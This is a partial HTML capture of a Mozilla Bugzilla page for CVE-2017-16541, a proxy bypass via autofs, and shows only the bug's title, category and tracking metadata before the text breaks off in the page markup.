<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1412081 - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1412081">
<meta property="og:description"
      content="RESOLVED (valentin.gosu) in Core - Networking: File. Last updated 2019-08-07.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="P2">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1412081 - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1412081&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1412081">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1412081">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/yui.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/global.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/util.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"flags\":{\"project\":{\"cf_root_cause\":\"---\",\"cf_webcompat_priority\":\"---\",\"cf_tracking_firefox_sumo\":\"---\",\"cf_fission_milestone\":\"---\",\"cf_a11y_review_project_flag\":\"---\"},\"tracking\":{\"cf_status_firefox95\":\"---\",\"cf_status_firefox93\":\"---\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_status_firefox58\":\"wontfix\",\"cf_status_firefox57\":\"wontfix\",\"cf_status_firefox63\":\"fixed\",\"cf_tracking_firefox_esr52\":\"-\",\"cf_status_firefox_esr60\":\"fixed\",\"cf_status_firefox61\":\"wontfix\",\"cf_status_firefox62\":\"fixed\",\"cf_tracking_firefox95\":\"---\",\"cf_tracking_firefox94\":\"---\",\"cf_tracking_firefox_esr91\":\"---\",\"cf_status_firefox60\":\"wontfix\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_tracking_firefox60\":\"-\",\"cf_status_firefox56\":\"wontfix\",\"cf_status_thunderbird_esr78\":\"---\",\"cf_status_firefox_esr91\":\"---\",\"cf_tracking_firefox57\":\"+\",\"cf_status_firefox_esr52\":\"wontfix\",\"cf_tracking_firefox58\":\"+\",\"cf_status_firefox94\":\"---\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_status_firefox59\":\"wontfix\",\"cf_tracking_firefox93\":\"---\",\"cf_tracking_firefox_esr60\":\"62+\",\"cf_status_firefox_esr78\":\"---\",\"cf_tracking_firefox59\":\"+\",\"cf_tracking_thunderbird_esr78\":\"---\"}},\"comments\":{\"cf_tracking_firefox60\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox59\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr60\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox_esr52\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox58\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox57\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"}},\"types\":[\"tracking\"]}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1412081;
  BUGZILLA.bug_title = '1412081 - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux';
  BUGZILLA.bug_summary = '(CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1412081';
  BUGZILLA.bug_keywords = 'csectype-disclosure, privacy, sec-moderate',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/field.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/comments.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1412081">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1412081"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1412081 - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="7UttscnCBYiUxvgnZkvhSPtGwVebQ9ojjAfGEWt7cJb8VU5s2Emd7uway8vKVqIXrqR360IO4udK0M7qqc8VowG3iM01dHXJrvJlqit2lpK3iARokKbLCHyOXniPs8HuC6Sju4JNBqGAUvfqxzrFizc4cEoeA8hQF4ROGGgG7ZW9C7fvYo8HlBYSVwBqB4sh1Jc2HmN5tDfclK4dlwJHlSRpOM3fzQtlGd6zeahzuuLVeiaAFGnaVvp9IE4OCPn1">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1412081" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635623246-qjd4CYHaEQvhoV0-TnGwX4tq7wsYEvaW6yT7AfbW9SI">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1412081" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1412081" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1412081">Bug 1412081</a>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2017-10-26 12:25 PDT" data-time="1509045934">4 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2018-07-16 15:23 PDT" data-time="1531779792">3 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16541">CVE-2017-16541</a>) Proxy bypass caused by autofs on Mac, Linux</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Core :: Networking: File, defect, P2)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Core
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Core</div>
            <div class="description">Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the <a href="https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox">Firefox</a> product. (<a href="https://wiki.mozilla.org/Modules/All#Core">More info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Core"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core&component=Networking%3A%20File#Networking%3A%20File" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">Networking: File
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Core :: Networking: File</div>
            <div class="description">For bugs in Mozilla's File IO code. This component deals with File specific issues like writing to disk, reading local files, etc Related problems with file:// protocol may also be addressed here.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;component=Networking%3A%20File&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Core&amp;component=Networking%3A%20File&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Core&amp;component=Networking%3A%20File"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core" data-component="Networking: File"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-version" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            unspecified

        </span>
    </div>

  
</div>

    <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">P2
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            normal

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (<span id="readable-bug-status" data-readable-bug-status="{&quot;cf_tracking_firefox59&quot;:&quot;+&quot;,&quot;cf_tracking_firefox_esr60&quot;:&quot;62+&quot;,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;cf_tracking_firefox58&quot;:&quot;+&quot;,&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;cf_status_firefox59&quot;:&quot;wontfix&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;keywords&quot;:[&quot;csectype-disclosure&quot;,&quot;privacy&quot;,&quot;sec-moderate&quot;],&quot;cf_tracking_firefox57&quot;:&quot;+&quot;,&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;status&quot;:&quot;RESOLVED&quot;,&quot;cf_status_firefox60&quot;:&quot;wontfix&quot;,&quot;cf_status_firefox62&quot;:&quot;fixed&quot;,&quot;dupe_of&quot;:null,&quot;cf_tracking_firefox94&quot;:&quot;---&quot;,&quot;cf_status_firefox61&quot;:&quot;wontfix&quot;,&quot;cf_status_firefox_esr60&quot;:&quot;fixed&quot;,&quot;cf_root_cause&quot;:&quot;---&quot;,&quot;resolution&quot;:&quot;FIXED&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr78&quot;:&quot;---&quot;,&quot;target_milestone&quot;:&quot;mozilla63&quot;,&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr52&quot;:&quot;wontfix&quot;,&quot;cf_tracking_thunderbird_esr91&quot;:&q